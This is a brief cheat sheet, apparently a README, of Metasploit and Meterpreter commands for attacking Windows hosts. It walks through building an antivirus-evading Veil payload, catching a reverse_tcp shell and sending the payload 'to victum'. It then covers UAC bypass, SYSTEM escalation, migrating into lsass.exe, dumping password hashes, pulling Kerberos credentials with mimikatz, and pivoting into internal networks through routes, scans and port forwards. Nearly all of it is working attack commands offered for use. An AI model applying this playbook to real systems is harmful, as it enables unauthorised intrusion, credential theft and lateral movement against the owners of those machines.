# Metasploit-Notes
Pre Exploitation:

Use /usr/share/veil-evasion to create undetected payload
use powershell/meterpreter/rev_tcp
set up port forwarding on your router to connect a port to your local machine
load auto_add_route

ls /usr/share/metasploit-framework/plugins

use exploit/multi/handler
show payloads
set payload windows/meterpreter/reverse_tcp
set lhost <your local ip>
set exitonsession false
exploit -j

send veil-evasion payload /root/veil-output/source/output.bat to victum



Post Exploitation:
sessions -i <session>
background
use exploits/windows/local/bypassuac 
use exploits/windows/local/bypassuac_inject
go to new session
getsystem
ps
migrate process to lsass.exe
hashdump
load mimikatz 
kerberos
if not using autoroute use command 'route add subnet netmask session#' -background -> route print -> make sure route has right session #
run arp_scanner -r <ip range>
run auxiliary/scanner/portscan/tcp to scan pivoted network
portfwd add -l 8000<localport> -p 80<remote port> -r <remote machine IP>
go to web browser and type in 127.0.0.1:8000
able to use this with ssh, telnet, etc.

** you can type 'load' or 'run' and hit tab complete to list extensions and modules**
